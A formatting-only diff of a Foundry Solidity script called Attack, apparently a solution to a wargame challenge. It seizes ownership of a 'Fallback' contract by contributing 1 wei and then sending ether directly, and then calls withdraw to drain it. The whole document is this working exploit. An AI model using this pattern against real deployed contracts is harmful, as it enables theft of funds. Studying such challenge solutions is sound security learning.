@@ -9,11 +9,11 @@ contract Attack is Script {
     error Attack__failedTransaction();
     address payable targetAddress;
 
-    function run() external returns(Fallback) {
+    function run() external returns (Fallback) {
         targetAddress = payable(vm.envAddress("FALLBACK_TARGET"));
         Fallback target = Fallback(targetAddress);
 
-        vm.startBroadcast();///////////////////////////////////////////////
+        vm.startBroadcast(); ///////////////////////////////////////////////
         console.log("It passed!!");
         console.log(address(target));
         console.log(msg.sender);
@@ -21,14 +21,13 @@ contract Attack is Script {
 
         target.contribute{value: 1 wei}();
         // Claim Ownership
-        (bool success, ) = address(target).call{value: 1 wei}("");
-        if(!success) revert Attack__failedTransaction();
+        (bool success,) = address(target).call{value: 1 wei}("");
+        if (!success) revert Attack__failedTransaction();
         // Drain Contract
         target.withdraw();
 
-        vm.stopBroadcast();////////////////////////////////////////////////
+        vm.stopBroadcast(); ////////////////////////////////////////////////
 
         return target;
     }
-
 }
